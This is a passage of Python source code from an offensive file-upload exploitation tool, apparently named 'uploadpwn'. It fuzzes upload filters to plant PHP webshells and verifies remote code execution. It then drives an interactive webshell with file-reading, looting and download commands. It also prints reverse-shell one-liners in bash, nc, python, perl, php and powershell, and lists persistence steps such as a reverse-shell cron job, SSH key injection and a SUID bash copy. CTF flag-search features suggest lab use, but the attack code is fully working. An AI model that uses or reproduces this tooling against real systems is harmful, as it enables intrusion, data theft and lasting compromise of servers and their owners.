            self.d.filter_detected("File Size Limit (<5MB)")
            self.results["size_limit"] = True

    def _probe_svg(self):
        s, b = self.upload("test.svg",
            b'<svg xmlns="http://www.w3.org/2000/svg"><circle r="1"/></svg>',
            "image/svg+xml")[:2]
        if self._ok(s, b):
            self.d.log("probe", "found", "SVG upload allowed → XXE/XSS surface")
            self.results["svg_allowed"] = True

    def _probe_client_side(self):
        """
        Detect if client-side validation is the ONLY protection.
        If .php with correct CT is accepted via direct POST, client-side is the only filter.
        """
        s, b = self.upload("test.php", b"<?php echo 'UP'; ?>", "image/jpeg")[:2]
        if self._ok(s, b):
            self.d.record_vuln("Client-Side Only Validation",
                "No server-side extension filter — client-side JS is the only protection. "
                "Bypassed automatically by sending requests directly.", "HIGH")
            self.results["client_side_only"] = True


# ═══════════════════════════════════════════════════════════════════════════════
#  FILTER MATRIX — Systematic ext × CT × magic combinatorial fuzzing
# ═══════════════════════════════════════════════════════════════════════════════

class FilterMatrix:
    """
    Systematic combinatorial filter testing.
    Tests extensions × content-types × magic bytes to build a complete
    map of what the server accepts. Then analyzes results to produce
    optimal attack configurations.
    """

    MAGIC_VARIANTS = {
        "none":  (b"<?php echo 'FMTEST'; ?>", None),
        "gif":   (b"GIF89a;\n<?php echo 'FMTEST'; ?>", "image/gif"),
        "png":   (b"\x89PNG\r\n\x1a\n<?php echo 'FMTEST'; ?>", "image/png"),
        "jpeg":  (b"\xff\xd8\xff\xe0<?php echo 'FMTEST'; ?>", "image/jpeg"),
        "bmp":   (b"BM<?php echo 'FMTEST'; ?>", "image/bmp"),
    }

    # Focused extension set for matrix testing (not 100+, but the important ones)
    EXTENSIONS = [
        # Direct PHP
        ".php", ".php3", ".php4", ".php5", ".php7", ".php8",
        ".phtml", ".phar", ".pht", ".pgif", ".inc",
        # Case variations
        ".PHP", ".Php", ".pHp", ".PHTML",
        # Double extensions
        ".php.jpg", ".php.png", ".php.gif",
        ".jpg.php", ".png.php", ".gif.php",
        ".jpg.phtml", ".png.phtml", ".gif.phtml",
        ".jpg.phar", ".png.phar", ".gif.phar",
        ".jpg.pht", ".png.pht", ".gif.pht",
        # Image only (for .htaccess-based execution)
        ".jpg", ".png", ".gif",
    ]

    def __init__(self, upload_fn, disc, field="uploadFile", threads=5):
        self.upload = upload_fn
        self.d = disc
        self.field = field
        self.threads = threads
        self.results = {}        # (ext, ct, magic) → bool
        self.accepted = []       # list of (ext, ct, magic) that passed
        self.blocked_exts = set()
        self.allowed_exts = set()
        self.required_cts = set()
        self.requires_magic = False
        self.optimal_combos = []
        self.filter_summary = ""

    def _ok(self, status, body):
        if status not in [200, 201, 302]:
            return False
        bad = ["only images", "not allowed", "invalid", "blocked", "failed",
               "disallowed", "rejected", "extension", "mime", "forbidden",
               "error", "denied", "illegal", "unsupported"]
        return not any(k in body.lower() for k in bad)

    def fuzz_and_analyze(self):
        """Run the full matrix fuzz and analyze results."""
        info(f"{'─' * 50}")
        info("FILTER MATRIX — Systematic combinatorial fuzzing")
        info(f"{'─' * 50}")

        # Phase 1: Extension fuzz with a known-good payload
        info("Phase 1: Extension fuzzing...")
        ext_results = self._fuzz_extensions()

        # Phase 2: Content-Type fuzz for allowed extensions
        if self.allowed_exts:
            info(f"Phase 2: Content-Type fuzzing for {len(self.allowed_exts)} allowed extensions...")
            self._fuzz_content_types(list(self.allowed_exts)[:10])

        # Phase 3: Magic byte fuzz for allowed (ext, CT) combos
        if self.accepted:
            info(f"Phase 3: Magic byte testing for {len(self.accepted)} combos...")
            self._fuzz_magic_bytes()

        # Phase 4: Analyze
        self._analyze()

        # Print summary
        self._print_summary()

        return self._build_results()

    def _fuzz_extensions(self):
        """Phase 1: Test which extensions are accepted."""
        # Use the best payload: magic bytes + image CT
        test_content = b"GIF89a;\n<?php echo 'FMTEST'; ?>"
        test_ct = "image/gif"

        fuzz_count = [0]
        total = len(self.EXTENSIONS)
        lock = threading.Lock()

        def _test_ext(ext):
            fn = f"test{ext}"
            try:
                s, b = self.upload(fn, test_content, test_ct)[:2]
            except:
                return
            with lock:
                fuzz_count[0] += 1
                if fuzz_count[0] % 10 == 0:
                    progress(fuzz_count[0], total, "ExtMatrix")
                if self._ok(s, b):
                    self.allowed_exts.add(ext)
                    self.accepted.append((ext, test_ct, "gif"))
                else:
                    self.blocked_exts.add(ext)

        with ThreadPoolExecutor(max_workers=min(self.threads, 10)) as pool:
            list(pool.map(_test_ext, self.EXTENSIONS))
        print()

        ok(f"Extensions: {len(self.allowed_exts)} allowed, "
           f"{len(self.blocked_exts)} blocked")
        if self.allowed_exts:
            print(f"  {G}Allowed:{W} {', '.join(sorted(self.allowed_exts)[:20])}")
        if self.blocked_exts and len(self.blocked_exts) <= 10:
            print(f"  {R}Blocked:{W} {', '.join(sorted(self.blocked_exts)[:20])}")

        return self.allowed_exts

    def _fuzz_content_types(self, exts):
        """Phase 2: For each allowed extension, test all Content-Types."""
        ct_results = {}  # ext → set of working CTs
        test_content = b"GIF89a;\n<?php echo 'FMTEST'; ?>"

        total = len(exts) * len(CT_IMAGE_EXTENDED)
        count = [0]
        lock = threading.Lock()

        def _test_ct(args):
            ext, ct = args
            fn = f"test{ext}"
            try:
                s, b = self.upload(fn, test_content, ct)[:2]
            except:
                return
            with lock:
                count[0] += 1
                if count[0] % 20 == 0:
                    progress(count[0], total, "CTMatrix")
                if self._ok(s, b):
                    if ext not in ct_results:
                        ct_results[ext] = set()
                    ct_results[ext].add(ct)
                    self.results[(ext, ct, "gif")] = True

        work = [(ext, ct) for ext in exts for ct in CT_IMAGE_EXTENDED]
        with ThreadPoolExecutor(max_workers=min(self.threads, 10)) as pool:
            list(pool.map(_test_ct, work))
        print()

        # Find which CTs are universally required
        if ct_results:
            all_working_cts = set.intersection(*ct_results.values()) if ct_results else set()
            if all_working_cts:
                self.required_cts = all_working_cts
                ok(f"Working Content-Types: {', '.join(sorted(all_working_cts)[:5])}")
            else:
                # Different exts need different CTs
                for ext, cts in ct_results.items():
                    ok(f"  {ext}: {', '.join(sorted(cts)[:3])}", 2)

    def _fuzz_magic_bytes(self):
        """Phase 3: Test if magic bytes are required for accepted combos."""
        # Pick the best accepted combo and test without magic
        if not self.accepted:
            return

        ext, ct, _ = self.accepted[0]
        test_plain = b"<?php echo 'FMTEST'; ?>"

        # Test without magic bytes
        try:
            s, b = self.upload(f"test{ext}", test_plain, ct)[:2]
            if self._ok(s, b):
                self.requires_magic = False
                info("Magic bytes NOT required — plain PHP accepted")
                return
        except:
            pass

        self.requires_magic = True
        info("Magic bytes REQUIRED — server validates file signatures")

        # Test each magic variant
        for magic_name, (content, preferred_ct) in self.MAGIC_VARIANTS.items():
            if magic_name == "none":
                continue
            use_ct = preferred_ct or ct
            try:
                s, b = self.upload(f"test{ext}", content, use_ct)[:2]
                if self._ok(s, b):
                    self.results[(ext, use_ct, magic_name)] = True
                    ok(f"Magic '{magic_name}' works with {ext}")
            except:
                pass

    def _analyze(self):
        """Phase 4: Analyze matrix results and produce optimal attack plan."""
        # Build optimal combos — prioritize extensions most likely to execute PHP
        php_exec_priority = [
            ".php", ".phtml", ".phar", ".pht", ".php5", ".php7", ".php8",
            ".jpg.php", ".png.php", ".gif.php",
            ".jpg.phtml", ".png.phtml", ".gif.phtml",
            ".jpg.phar", ".png.phar", ".gif.phar",
            ".jpg.pht", ".png.pht", ".gif.pht",
            ".php.jpg", ".php.png", ".php.gif",
            ".PHP", ".Php", ".pHp", ".PHTML",
            ".php3", ".php4", ".pgif", ".inc",
        ]

        for ext in php_exec_priority:
            if ext in self.allowed_exts:
                # Find best CT for this ext
                best_ct = "image/gif"  # default
                for ct in ["image/gif", "image/jpeg", "image/png"]:
                    if self.results.get((ext, ct, "gif")):
                        best_ct = ct
                        break

                best_magic = "gif" if self.requires_magic else "none"
                self.optimal_combos.append((ext, best_ct, best_magic))

        # Build filter summary
        summary_parts = []
        if self.blocked_exts and ".php" in self.blocked_exts:
            summary_parts.append("Extension blacklist (.php blocked)")
        if self.allowed_exts:
            allowed_php = [e for e in self.allowed_exts
                           if any(p in e for p in ["php", "pht", "phar"])]
            if allowed_php:
                summary_parts.append(f"PHP-like exts allowed: {', '.join(allowed_php[:5])}")
        if self.requires_magic:
            summary_parts.append("Magic bytes required (MIME validation)")
        if self.required_cts:
            summary_parts.append(f"Required Content-Type: {', '.join(list(self.required_cts)[:3])}")
        if not summary_parts:
            summary_parts.append("No server-side filters detected")

        self.filter_summary = " | ".join(summary_parts)

    def _print_summary(self):
        """Print human-readable matrix summary."""
        print(f"\n{C}{BOLD}  FILTER MATRIX RESULTS:{W}")
        print(f"    {self.filter_summary}")
        if self.optimal_combos:
            print(f"\n{G}{BOLD}  OPTIMAL ATTACK COMBOS (ranked):{W}")
            for i, (ext, ct, magic) in enumerate(self.optimal_combos[:10], 1):
                magic_label = f" + {magic} magic" if magic != "none" else ""
                print(f"    {G}{i}.{W} shell{ext}  CT={ct}{magic_label}")
        else:
            print(f"    {R}No viable combos found — try --htaccess or --polyglot{W}")
        print()

    def _build_results(self):
        """Build results dict compatible with smart_attack() and FilterProbe format."""
        r = {
            "matrix_mode": True,
            "optimal_combos": self.optimal_combos,
            "allowed_exts": list(self.allowed_exts),
            "blocked_exts": list(self.blocked_exts),
            "requires_magic": self.requires_magic,
            "required_cts": list(self.required_cts),
            "filter_summary": self.filter_summary,
            # Backward-compatible keys for smart_attack()
            "ext_blacklist": ".php" in self.blocked_exts,
            "whitelist": len(self.blocked_exts) > len(self.allowed_exts),
            "ct_filter": bool(self.required_cts),
            "mime_filter": self.requires_magic,
            "svg_allowed": ".svg" not in self.blocked_exts,
        }
        return r


# ═══════════════════════════════════════════════════════════════════════════════
#  INTERACTIVE WEBSHELL
# ═══════════════════════════════════════════════════════════════════════════════

class WebShell:
    def __init__(self, session, shell_url, cmd_param="cmd", disc=None):
        self.session = session
        self.shell_url = shell_url
        self.cmd_param = cmd_param
        self.d = disc
        self.history = []
        self.os_type = None

    @staticmethod
    def _strip_polyglot(raw_bytes):
        """
        Extract command output from PNG/GIF/JPEG polyglot shells.

        Key insight: when PHP executes inside a PNG polyglot, the response is NOT
        a valid PNG. The PHP code (e.g. <?php system(...); ?>) gets REPLACED by
        command output, but all surrounding binary PNG data remains. So we find
        the command output by looking for the text between known binary markers.
        """
        text = raw_bytes.decode('utf-8', errors='replace')

        def _extract_after_comment(text):
            """Extract clean text after Comment marker, stripping trailing binary."""
            for marker in ['Comment\x00', 'Comment ']:
                idx = text.find(marker)
                if idx != -1:
                    after = text[idx + len(marker):]
                    # Command output ends where binary resumes (CRC + IEND).
                    # Use ASCII range check — \ufffd (replacement char) is "printable"
                    # in Python but indicates binary data decoded with errors='replace'.
                    clean = []
                    for line in after.split('\n'):
                        if not line:
                            clean.append(line)
                            continue
                        ascii_printable = sum(1 for c in line if 0x20 <= ord(c) <= 0x7e or c in '\t\r')
                        if ascii_printable / len(line) < 0.7:
                            break
                        clean.append(line)
                    return '\n'.join(clean).strip()
            return None

        # PNG polyglot: output is between "Comment\x00" and trailing binary
        if b'\x89PNG' in raw_bytes[:8]:
            result = _extract_after_comment(text)
            if result is not None:
                return result

        # JPEG polyglot: output is between COM marker content and binary
        if raw_bytes[:2] == b'\xff\xd8':
            result = _extract_after_comment(text)
            if result is not None:
                return result

        # GIF / text magic
        for magic in ["GIF89a;", "GIF89a", "%PDF", "BM"]:
            if text.startswith(magic):
                text = text[len(magic):].lstrip(";\n\r ")
        return text.strip()

    def run(self, cmd):
        url = f"{self.shell_url}?{self.cmd_param}={quote(cmd)}"
        try:
            r = self.session.get(url, timeout=20)
            # Use raw bytes for polyglot extraction, fall back to text
            if r.content[:4] in (b'\x89PNG', b'\xff\xd8\xff\xe0', b'\xff\xd8\xff\xe1'):
                return self._strip_polyglot(r.content)
            out = r.text.strip()
            # Check for PNG/JPEG in response even if first 4 bytes differ
            if b'Comment\x00' in r.content and (b'PNG' in r.content[:8] or b'\xff\xd8' in r.content[:4]):
                return self._strip_polyglot(r.content)
            for magic in ["GIF89a;", "GIF89a", "%PDF", "BM"]:
                if out.startswith(magic):
                    out = out[len(magic):].lstrip(";\n\r ")
            return out
        except Exception as e:
            return f"[ERROR] {e}"

    def detect_os(self):
        out = self.run("echo %OS%")
        if "Windows" in out:
            self.os_type = "windows"
        else:
            self.os_type = "linux"
        return self.os_type

    def interactive(self, winning_file="", winning_shell="", winning_ct=""):
        print(f"""
{M}{BOLD}╔══════════════════════════════════════════════════════════════╗
║                   RCE CONFIRMED — SHELL ACTIVE               ║
╠══════════════════════════════════════════════════════════════╣
║  File     : {winning_file[:47]:<47}║
║  Shell    : {winning_shell[:47]:<47}║
║  CT       : {winning_ct[:47]:<47}║
║  URL      : {self.shell_url[:47]:<47}║
║  Param    : {self.cmd_param[:47]:<47}║
╚══════════════════════════════════════════════════════════════╝{W}

{Y}  Reproduction:{W}
  curl '{self.shell_url}?{self.cmd_param}=id'
""")

        info("Quick recon...")
        self.detect_os()

        if self.os_type == "windows":
            recon = [("whoami", "whoami"), ("hostname", "hostname"),
                     ("ipconfig", "ipconfig"), ("dir", "dir")]
        else:
            recon = [("whoami", "whoami"), ("id", "id"),
                     ("hostname", "hostname"), ("uname", "uname -a"),
                     ("pwd", "pwd")]

        for label, cmd in recon:
            out = self.run(cmd)
            print(f"  {G}{label:<12}{W}: {out[:120]}")

        print(f"""
{C}  Interactive WebShell{W}  (type !help for commands)
""")
        while True:
            try:
                cmd = input(f"{M}{BOLD}uploadpwn{W} {B}>{W} ").strip()
            except (KeyboardInterrupt, EOFError):
                print()
                break

            if not cmd:
                continue

            self.history.append(cmd)

            if cmd == "!exit":
                break
            elif cmd == "!help":
                print(f"""
{Y}  Built-in commands:{W}
    !read <path>           — read a file
    !ls <path>             — list directory
    !find <name>           — find files by name
    !download <path>       — save file locally
    !upload <local> <remote> — upload file to server
    !revshell <ip> <port>  — generate reverse shell one-liners
    !loot                  — auto-collect system info
    !flag                  — search for flags (CTF mode)
    !persist               — persistence suggestions
    !history               — command history
    !exit                  — exit webshell
    <anything>             — execute on target
""")
            elif cmd == "!history":
                for i, c in enumerate(self.history, 1):
                    print(f"  {DIM}{i:>3}  {c}{W}")

            elif cmd.startswith("!read "):
                path = cmd[6:].strip()
                out = self.run(f"cat {path}" if self.os_type != "windows" else f"type {path}")
                print(f"\n{G}--- {path} ---{W}\n{out}")

            elif cmd.startswith("!ls "):
                path = cmd[4:].strip()
                out = self.run(f"ls -la {path}" if self.os_type != "windows" else f"dir {path}")
                print(out)

            elif cmd.startswith("!find "):
                name = cmd[6:].strip()
                if self.os_type == "windows":
                    out = self.run(f'dir /s /b C:\\*{name}*')
                else:
                    out = self.run(f"find / -name '{name}' 2>/dev/null")
                print(out)

            elif cmd.startswith("!download "):
                path = cmd[10:].strip()
                out = self.run(f"base64 {path}")
                if out and "[ERROR]" not in out:
                    try:
                        data = base64.b64decode(out)
                        local = os.path.basename(path)
                        with open(local, "wb") as f:
                            f.write(data)
                        ok(f"Downloaded → {local} ({len(data)} bytes)")
                    except:
                        fail("b64 decode failed — file may be binary/large")
                        print(out[:500])
                else:
                    print(out)

            elif cmd.startswith("!revshell "):
                parts = cmd.split()
                if len(parts) >= 3:
                    ip, port = parts[1], parts[2]
                    print(f"""
{Y}Reverse Shell One-Liners:{W}
  bash:      bash -i >& /dev/tcp/{ip}/{port} 0>&1
  bash b64:  echo '{base64.b64encode(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1".encode()).decode()}' | base64 -d | bash
  nc:        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f
  python:    python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
  perl:      perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
  php:       php -r '$s=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'
  powershell: $c=New-Object Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}};$c.Close()

{G}Listener:{W}  nc -lvnp {port}
""")

            elif cmd == "!loot":
                if self.os_type == "windows":
                    loot_cmds = [
                        ("Whoami /priv", "whoami /priv"),
                        ("Systeminfo", "systeminfo"),
                        ("Users", "net user"),
                        ("Network", "ipconfig /all"),
                        ("Listening", "netstat -ano"),
                        ("Scheduled", "schtasks /query /fo LIST"),
                        ("Services", "wmic service list brief"),
                    ]
                else:
                    loot_cmds = [
                        ("OS", "cat /etc/os-release 2>/dev/null"),
                        ("Users", "cat /etc/passwd"),
                        ("Sudo", "sudo -l 2>/dev/null"),
                        ("SUID", "find / -perm -4000 2>/dev/null | head -20"),
                        ("Cron", "cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null"),
                        ("Network", "ip a 2>/dev/null || ifconfig"),
                        ("Listening", "ss -tlnp 2>/dev/null || netstat -tlnp"),
                        ("Env", "env"),
                        ("Writable", "find / -writable -type d 2>/dev/null | head -10"),
                        ("Capabilities", "getcap -r / 2>/dev/null"),
                        ("Running", "ps aux | head -30"),
                    ]
                for label, lcmd in loot_cmds:
                    out = self.run(lcmd)
                    if out and "[ERROR]" not in out:
                        print(f"\n{G}{BOLD}[{label}]{W}")
                        print(out[:600])

            elif cmd == "!flag":
                info("Searching for flags...")
                if self.os_type == "windows":
                    searches = [
                        'dir /s /b C:\\flag*',
                        'dir /s /b C:\\Users\\*flag*',
                        'findstr /si "HTB{\\|THM{\\|FLAG{\\|flag{" C:\\Users\\*.txt',
                    ]
                else:
                    searches = [
                        "cat /flag.txt 2>/dev/null",
                        "cat /root/flag.txt 2>/dev/null",
                        "find / -name 'flag*' -type f 2>/dev/null",
                        "find / -name '*.txt' -exec grep -l 'HTB{\\|THM{\\|FLAG{' {} + 2>/dev/null",
                        "cat /home/*/flag* 2>/dev/null",
                        "cat /home/*/user.txt 2>/dev/null",
                        "cat /root/root.txt 2>/dev/null",
                    ]
                for s in searches:
                    out = self.run(s)
                    if out and "[ERROR]" not in out and out.strip():
                        print(f"  {Y}★{W} {out[:300]}")
                        # Check for flag patterns
                        for pattern in [r'HTB\{[^}]+\}', r'THM\{[^}]+\}',
                                        r'FLAG\{[^}]+\}', r'flag\{[^}]+\}']:
                            flags = re.findall(pattern, out)
                            for flag in flags:
                                pwn(f"FLAG FOUND: {flag}")
                                if self.d:
                                    self.d.record_flag(flag)

            elif cmd == "!persist":
                print(f"""
{Y}Persistence Suggestions:{W}
  1. SSH key:     echo '<your pubkey>' >> ~/.ssh/authorized_keys
  2. Cron:        (crontab -l; echo '* * * * * /bin/bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"') | crontab -
  3. Web shell:   Already have one at {self.shell_url}
  4. SUID bash:   cp /bin/bash /tmp/.bash; chmod u+s /tmp/.bash (then /tmp/.bash -p)
  5. Service:     Create a systemd service that runs your payload
""")

            else:
                out = self.run(cmd)
                if out:
                    print(out)
                else:
                    print(f"{DIM}(no output){W}")


# ═══════════════════════════════════════════════════════════════════════════════
#  CORE ATTACK ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class UploadAttacker:
    def __init__(self, sm, upload_url, shell_dirs, cmd_param="cmd",
                 field="uploadFile", flag_path="/flag.txt", verbose=False,
                 disc=None, interactive=False, threads=5, delay=0,
                 server_type="all"):
        self.sm = sm
        self.upload_url = upload_url
        self.shell_dirs = list(shell_dirs)
        self.cmd_param = cmd_param
        self.field = field
        self.flag_path = flag_path
        self.verbose = verbose
        self.d = disc
        self.interactive = interactive
        self.threads = threads
        self.delay = delay
        self.server_type = server_type
        self.extra_fields = sm.find_upload_extra_fields() if sm else {}
        self.rce_found = False
        self._lock = threading.Lock()
        self.parser = ResponseParser()
        self._rename_pattern = None  # Set by analyze_source_filters (e.g. "date_prefix")

    def upload(self, filename, content, content_type, extra_fields=None):
        """Core upload function. Returns (status, body, response)."""
        if self.delay:
            time.sleep(self.delay)
        files = {self.field: (filename, content, content_type)}
        data = {**self.extra_fields, **(extra_fields or {})}
        try:
            r = self.sm.session.post(self.upload_url, files=files,
                                     data=data, allow_redirects=True,
                                     timeout=self.sm.timeout)
            return r.status_code, r.text, r
        except Exception as e:
            return 0, str(e), None

    def upload_raw_multipart(self, filename, content, content_type,
                             raw_filename_bytes=None):
        """
        Send a raw multipart request with exact control over the
        Content-Disposition header. Used for raw null bytes, unicode, etc.
        """
        boundary = f"----WebKitFormBoundary{''.join(random.choices(string.ascii_letters + string.digits, k=16))}"

        if raw_filename_bytes is None:
            raw_filename_bytes = filename.encode("utf-8")

        body = b""
        # Extra fields first
        for k, v in self.extra_fields.items():
            body += f"--{boundary}\r\n".encode()
            body += f'Content-Disposition: form-data; name="{k}"\r\n\r\n'.encode()
            body += f"{v}\r\n".encode()

        # File field with raw filename
        body += f"--{boundary}\r\n".encode()
        body += b'Content-Disposition: form-data; name="' + self.field.encode() + b'"; filename="'
        body += raw_filename_bytes
        body += b'"\r\n'
        body += f"Content-Type: {content_type}\r\n\r\n".encode()
        body += content
        body += f"\r\n--{boundary}--\r\n".encode()

        headers = {
            "Content-Type": f"multipart/form-data; boundary={boundary}",
        }
        try:
            r = self.sm.session.post(self.upload_url, data=body,
                                     headers=headers, timeout=self.sm.timeout)
            return r.status_code, r.text, r
        except Exception as e:
            return 0, str(e), None

    def upload_chunked(self, filename, content, content_type):
        """Upload using Transfer-Encoding: chunked to bypass size filters."""
        boundary = f"----WebKitFormBoundary{''.join(random.choices(string.ascii_letters + string.digits, k=16))}"

        body = b""
        for k, v in self.extra_fields.items():
            body += f"--{boundary}\r\n".encode()
            body += f'Content-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'.encode()

        body += f"--{boundary}\r\n".encode()
        body += f'Content-Disposition: form-data; name="{self.field}"; filename="{filename}"\r\n'.encode()
        body += f"Content-Type: {content_type}\r\n\r\n".encode()
        body += content
        body += f"\r\n--{boundary}--\r\n".encode()

        # Build chunked encoding manually
        chunk_size = 256
        chunked_body = b""
        for i in range(0, len(body), chunk_size):
            chunk = body[i:i + chunk_size]
            chunked_body += f"{len(chunk):x}\r\n".encode() + chunk + b"\r\n"
        chunked_body += b"0\r\n\r\n"

        headers = {
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Transfer-Encoding": "chunked",
        }
        # Remove Content-Length if present
        try:
            r = self.sm.session.post(self.upload_url, data=chunked_body,
                                     headers=headers, timeout=self.sm.timeout)
            return r.status_code, r.text, r
        except Exception as e:
            return 0, str(e), None

    def is_success(self, status, body):
        if status not in [200, 201, 302]:
            return False
        bad = ["only images", "not allowed", "invalid file", "blocked",
               "upload failed", "disallowed", "rejected", "invalid extension",
               "mime type", "forbidden", "error uploading", "file type not",
               "not permitted", "denied", "illegal", "unsupported file"]
        bl = body.lower()
        return not any(k in bl for k in bad)

    def _process_upload_response(self, filename, response_text, response_obj):
        """Parse upload response for renamed filename, paths, URLs."""
        if not response_text:
            return None

        # Try to extract server-assigned filename
        server_name = self.parser.extract_filename(response_text, filename)
        if server_name:
            debug(f"Server renamed: {filename} → {server_name}")
            if self.d:
                self.d.record_upload(filename, server_name)
            return server_name

        # Try to extract direct URL
        urls = self.parser.extract_url(response_text, self.sm.target)
        if urls:
            debug(f"Response contains URL: {urls[0]}")
            return urls[0]

        # Try to extract paths
        paths = self.parser.extract_upload_path(response_text)
        for p_item in paths:
            if p_item not in self.shell_dirs:
                web_path = "/" + p_item.lstrip("/")
                if not web_path.endswith("/"):
                    web_path = os.path.dirname(web_path) + "/"
                if web_path not in self.shell_dirs:
                    self.shell_dirs.append(web_path)
                    debug(f"New upload dir from response: {web_path}")

        # Check for error paths
        error_paths = self.parser.extract_error_paths(response_text)
        for ep in error_paths:
            if self.d:
                self.d.record_path(ep, "upload_response")

        return None

    def check_execution(self, filename, marker, server_filename=None):
        """
        Check if an uploaded file EXECUTES PHP by looking for the marker string
        in the GET response (without PHP tags around it).
        Returns (executes: bool, url: str) — the URL where it executed.
        Uses only priority dirs (top 5) for speed.
        """
        # Build filename candidates
        fns = [filename]
        if server_filename and server_filename != filename:
            fns.insert(0, server_filename)
        # Also try cleaned filename (server strips %00, %20, etc.)
        clean = filename.replace("%00", "").replace("\x00", "").replace("%20", "") \
                        .replace("%0a", "").replace("%0d%0a", "").replace("%0d", "")
        if clean not in fns:
            fns.append(clean)
        # For null-byte: server may store as everything before %00
        if "%00" in filename or "\x00" in filename:
            before_null = filename.split("%00")[0].split("\x00")[0]
            if before_null and before_null not in fns:
                fns.append(before_null)

        # Check only top dirs (discovered dirs are at front)
        check_dirs = self.shell_dirs[:5]

        for d in check_dirs:
            for fn in fns:
                url = f"{self.sm.target}{d}{fn}"
                try:
                    r = self.sm.session.get(url, timeout=6)
                    if r.status_code == 200:
                        body = r.text
                        # Strip magic bytes
                        for magic_str in ["GIF89a;", "GIF89a", "\x89PNG\r\n\x1a\n"]:
                            if body.startswith(magic_str):
                                body = body[len(magic_str):].lstrip(";\n\r ")
                        # Check: marker present AND PHP tags NOT present = executed
                        if marker in body and "<?php" not in body and "<?" not in body.split(marker)[0][-10:]:
                            return True, url
                except:
                    pass
        return False, ""

    def verify_rce(self, filename, server_filename=None, cmd="id",
                   extra_urls=None, rename_pattern=None):
        """
        Verify RCE by accessing uploaded shell.
        Uses ThreadPoolExecutor for parallel directory/filename checking.
        """
        candidates = []

        # Add server-reported filename/URL
        if server_filename:
            if server_filename.startswith("http"):
                candidates.append(("__direct__", server_filename))
            else:
                candidates.append(("__name__", server_filename))

        # Original filename variants
        clean = re.sub(r'\.\.+[/\\]', '', os.path.basename(
            filename.replace("%00", "").replace("\x00", "").lstrip("./").lstrip("%2f")))
        for fn_candidate in list(dict.fromkeys([clean, filename, os.path.basename(filename)])):
            candidates.append(("__name__", fn_candidate))

        # Add date-prefixed variants (servers that rename with date('ymd')_filename)
        if rename_pattern == "date_prefix" or self._rename_pattern == "date_prefix":
            import datetime
            now = datetime.datetime.now()
            base = os.path.basename(clean)
            for dp in [
                now.strftime("%y%m%d") + "_",
                now.strftime("%Y%m%d") + "_",
                now.strftime("%y%m%d%H%M%S") + "_",
                now.strftime("%Y-%m-%d") + "_",
            ]:
                candidates.append(("__name__", f"{dp}{base}"))

        if extra_urls:
            for u in extra_urls:
                candidates.append(("__direct__", u))

        params = [self.cmd_param, "0", "c", "1", "exec", "x", "command"]

        # Build all URLs to check
        urls_to_check = []
        for d in self.shell_dirs:
            for ctype, cval in candidates:
                for param in params:
                    if ctype == "__direct__":
                        url = f"{cval}?{param}={cmd}"
                    else:
                        url = f"{self.sm.target}{d}{cval}?{param}={cmd}"
                    urls_to_check.append((url, param))

        # Check in parallel
        result = [None]
        result_lock = threading.Lock()

        def _check_url(url_param):
            url, param = url_param
            if result[0]:  # Already found
                return None
            try:
                r = self.sm.session.get(url, timeout=6)
                if r.status_code == 200 and r.text.strip():
                    text = r.text.strip()
                    for magic in ["GIF89a;", "GIF89a", "\x89PNG", "%PDF", "BM"]:
                        if text.startswith(magic):
                            text = text[len(magic):].lstrip(";\n\r ")
                    if any(x in text for x in
                           ["uid=", "root", "www-data", "/bin",
                            "/usr", "daemon", "/var", "nt authority",
                            "iis apppool", "groups="]):
                        with result_lock:
                            if not result[0]:
                                result[0] = (True, url.split("?")[0], param, text)
                        return result[0]
            except:
                pass
            return None

        max_workers = min(self.threads * 2, len(urls_to_check), 20)
        if max_workers < 1:
            max_workers = 1
        with ThreadPoolExecutor(max_workers=max_workers) as pool:
            futures = [pool.submit(_check_url, u) for u in urls_to_check]
            for f in as_completed(futures):
                if result[0]:
                    # Cancel remaining futures
                    for remaining in futures:
                        remaining.cancel()
                    break

        if result[0]:
            return result[0]
        return False, "", self.cmd_param, ""

    def launch_shell(self, filename, url, param, output, shell_variant, content_type):
        with self._lock:
            if self.rce_found:
                return
            self.rce_found = True

        pwn("RCE CONFIRMED!")
        print(f"""
{G}{BOLD}╔═══════════════════════════════════════════════════════════╗
║  ✓  SHELL IS LIVE                                         ║
╠═══════════════════════════════════════════════════════════╣
║  File   : {filename[:48]:<48}║
║  URL    : {url[:48]:<48}║
║  Param  : {param:<48}║
║  Shell  : {shell_variant:<48}║
║  CT     : {content_type[:48]:<48}║
╚═══════════════════════════════════════════════════════════╝{W}
  Output: {output[:200]}
""")
        if self.d:
            self.d.record_rce(filename, url, output, shell_variant, content_type)

        if self.interactive:
            ws = WebShell(self.sm.session, url, param, self.d)
            ws.interactive(filename, shell_variant, content_type)
        else:
            info(f"curl '{url}?{param}=id'")
            info("Run with --interactive for webshell")

    # ── SOURCE CODE FILTER ANALYZER ─────────────────────────────────────────

    def analyze_source_filters(self, source_code):
        """
        Parse PHP upload source code to extract regex filters, then determine
        which extensions/content-types/magic bytes bypass ALL of them.
        Returns dict with bypass strategy or None.
        """
        if not source_code:
            return None

        info("Analyzing upload source code for filter bypass...")

        result = {
            "blacklist_regex": [],
            "whitelist_regex": [],
            "mime_check": False,
            "magic_check": False,
            "size_limit": None,
            "upload_dir": None,
            "rename_pattern": None,
            "bypass_exts": [],
            "needs_magic": False,
            "needs_ct_spoof": False,
        }

        # ── Extract regex patterns from source ──
        # Common PHP patterns: preg_match('/pattern/', $var)
